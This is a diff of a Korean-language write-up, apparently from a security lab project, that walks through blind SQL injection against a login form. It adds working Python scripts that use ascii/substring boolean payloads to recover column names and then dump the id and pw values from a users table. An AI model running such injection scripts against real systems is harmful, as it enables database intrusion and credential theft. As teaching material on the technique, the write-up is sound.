@@ -51,7 +51,7 @@ Blind_SQL_Injection 이란 일반적인 SQL_Injection과 비슷하게 취약점�
 
 ![image](https://user-images.githubusercontent.com/66786006/221413659-ae57300b-7280-41df-bbe2-ee799cca3dc5.png)
 
-4 에서 Length가 다른 하나를 확인 할 수 있습니다.
+Payload 4 에서 Length가 다른 하나를 확인 할 수 있습니다.
 
 **2. 데이터 베이스 이름 찾기**
 
@@ -132,7 +132,7 @@ def fun_5(dbname,table_len):
  
  테이블의 이름은 각각 board, usesrs 임을 알 수 있습니다.
  
- **5. 각 테이블별 컬름이름 길이 찾기**
+ **5. 각 테이블별 컬럼이름 길이 찾기**
  ```python
  def fun_6(table_name):
     print('processing Fun_6...')
@@ -153,7 +153,78 @@ def fun_5(dbname,table_len):
     print(res)
     return res
  ```
-ㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡㅡ 여기서 부터 수정
+해당 반복문을 돌며 각 테이블별 컬럼 이름의 길이를 찾을 수 있습니다. 이때 MAX_LENGTH 를 임의로 정하여 MAX_LENGTH 에 도달하여도 길이를 찾을 수 없으면 더이상 컬럼이 존재하지 않는 형식으로 만들어져 있습니다. 
+
+[fun 6]
+
+결과는 위 사진과 같이 입력을 ['board','usesrs']을 넣었을 때 각각의 컬럼의 길이가 [4, 7, 7, 4, 3, 4], [4, 19, 17, 29, 24, 2, 2]으로 나오는 것을 확인 할 수 있습니다.
+
+**6. 컬럼이름 찾기**
+
+```python
+def fun_7(table_name,col_len):
+    print('processing Fun_7...')
+    res=[]
+    for num_1 in range(len(col_len)):
+        col=[]
+        for num_2 in range(col_len[num_1]):
+            num_3 = 65
+            while True:
+                SQLINJq = f"' or 1=1 and ascii(substring((select column_name from information_schema.columns where table_name='{table_name}' limit {num_1},1),{num_2+1},1)) = {num_3}#"
+                req = requests.post(url,data=f"id={SQLINJq}&pw=pw&login=Login",headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                if  "invalid" not in req.text:
+                    #print(f"success with {num_3}")
+                    col.append(chr(num_3))
+                    break
+                num_3 +=1
+        res.append(''.join(col))
+    print(res)
+```
+컬럼의 이름을 찾는것은 테이블의 이름을 찾는 형식과 유사합니다. 다음은 입력을 `fun_7('users',[4, 19, 17, 29, 24, 2, 2])`으로 했을 때의 결과입니다.
+
+[fun 7]
+
+위에서 찾은 컬럼의 길이와 일치하는 것을 볼 수 있습니다.
+
+**7. 원하는 데이터 얻기**
+
+```python
+def fun_8(table_name, col_names):
+    print('processing Fun_8...')
+    res = []
+    
+    for col_num, col_name in enumerate(col_names):
+        num_0 = 0
+        
+        while True:
+            col = []
+            num_1 = 0
+            while True:
+                end = 0
+                for num_2 in range(32, 128):
+                    SQLINJq = f"' or 1=1 and ascii(substring((select {col_name} from {table_name} limit {num_0},1),{num_1+1},1))={num_2}#"
+                    #print(SQLINJq)
+                    req = requests.post(url, data=f"id={SQLINJq}&pw=pw&login=Login", headers={'Content-Type': 'application/x-www-form-urlencoded'})
+                    if "invalid" not in req.text:
+                        #print(f"success with {num_2}")
+                        col.append(chr(num_2))
+                        end = 1
+                        break
+                num_1 += 1
+                if not end:
+                    break
+            if not col:
+                break    
+            res.append(''.join(col))
+            num_0 += 1
+    
+    print(res)
+```
+마지막으로는 실제로 컬럼안의 정보를 얻는 작업입니다. 예시로 `users` 테이블의 `id` ,`pw` 컬럼의 정보를 얻기위하여 입력값을 `fun_8('users',['id','pw'])`으로 설정하였습니다.
+
+[fun 8]
+
+로그인 form에서 Blind_SQL_Injection을 이용하여 id 값과 pw 값을 얻는데 성공하였습니다.
 
 ## 게시판 화면
 
